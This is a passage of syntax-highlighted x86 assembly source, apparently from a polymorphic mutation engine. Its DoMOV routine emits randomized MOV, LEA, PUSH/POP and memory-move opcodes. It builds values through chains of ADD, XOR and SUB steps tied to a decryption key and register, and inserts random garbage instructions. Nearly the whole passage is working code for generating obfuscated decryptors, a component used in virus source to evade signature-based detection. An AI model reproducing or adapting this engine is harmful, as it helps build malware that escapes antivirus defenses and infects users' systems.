                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PUSHSUB_R</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
   </span><span class="sc5">@@PUSHSUB_R</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUBRegReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@PUSH_01</span><span class="sc0">
   </span><span class="sc5">@@PUSHSUB_D</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUB</span><span class="sc0">     </span><span class="sc1">; Make a SUB Reg,Value or ADD Reg,NEG(Value)</span><span class="sc0">
     </span><span class="sc5">@@PUSH_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;we don't make garbage here, since I have to mantain the flags</span><span class="sc0">
                </span><span class="sc1">;of the comparision</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">  </span><span class="sc1">; Make the POP Index2Register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">            </span><span class="sc1">; Store the opcode</span><span class="sc0">
            </span><span class="sc1">;    jmp   @@End</span><span class="sc0">

       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; Restore BufferRegister (if it was selected)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">; Conserve EDI when POPAD</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">DoCMP</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This very used function performs a move operation with the register in</span><span class="sc0">
</span><span class="sc1">;; DL and the value in EAX. It can do a MOV Reg,Value, a LEA Reg,[Value] or</span><span class="sc0">
</span><span class="sc1">;; a PUSH Value/Garbage/POP Reg. Sometimes it doesn't give the correct value</span><span class="sc0">
</span><span class="sc1">;; just at the beginning, so the function adjusts the value with a sucession</span><span class="sc0">
</span><span class="sc1">;; of XORs, ADDs or SUBs to get the correct value.</span><span class="sc0">
</span><span class="sc5">DoMOV</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">               </span><span class="sc1">; Save registers</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@NoRecursives</span><span class="sc0">
       </span><span class="sc5">@@RepeatRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVDirect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LEA</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@PUSHPOP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVMEM</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@RepeatRandom</span><span class="sc0">

     </span><span class="sc5">@@Adjust</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRecursives2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">@@Adj_Loop01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
   </span><span class="sc5">@@Adj_OtherFlags</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Adj_01</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Adj_XOR</span><span class="sc0">
   </span><span class="sc5">@@Adj_ADD</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_ADD01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_ADD01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADDRegReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">
   </span><span class="sc5">@@Adj_ADD01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADD</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">
   </span><span class="sc5">@@Adj_XOR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_XOR01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_XOR01</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORRegReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">
   </span><span class="sc5">@@Adj_XOR01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXOR</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">
   </span><span class="sc5">@@Adj_01</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Adj_OtherFlags</span><span class="sc0">
   </span><span class="sc5">@@Adj_SUB</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_SUB01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_SUB01</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUBRegReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Adj_Next01</span><span class="sc0">
   </span><span class="sc5">@@Adj_SUB01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUB</span><span class="sc0">

       </span><span class="sc5">@@Adj_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@AdjustTimes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Adj_Loop01</span><span class="sc0">

       </span><span class="sc1">;; ECX=Current value, EBX=Desired value</span><span class="sc0">
       </span><span class="sc5">@@Adj_Other</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Adj_Other</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Adj_FinalADD</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Adj_FinalXOR</span><span class="sc0">
    </span><span class="sc5">@@Adj_FinalSUB</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUB</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
    </span><span class="sc5">@@Adj_FinalADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADD</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
    </span><span class="sc5">@@Adj_FinalXOR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXOR</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

     </span><span class="sc5">@@AdjustTimes</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Padding</span><span class="sc0">

     </span><span class="sc5">@@MOVDirect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
     </span><span class="sc5">@@LEA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058Dh</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
     </span><span class="sc5">@@LEA2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LEA</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008Dh</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@LEA2_b</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@LEA2_d</span><span class="sc0">
         </span><span class="sc5">@@LEA2_b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
         </span><span class="sc5">@@LEA2_d</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

    </span><span class="sc5">@@PUSHPOP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHValue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

    </span><span class="sc5">@@MOVMEM</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRecursives</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

      </span><span class="sc5">@@NoRecursives2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc5">@@NoRecursives</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRecursives</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@MOVDirect</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LEA2</span><span class="sc0">

         </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">  </span><span class="sc1">; Mark this register as "touched" (since we</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; moved a value</span><span class="sc0">
                                                               </span><span class="sc1">; to it)</span><span class="sc0">
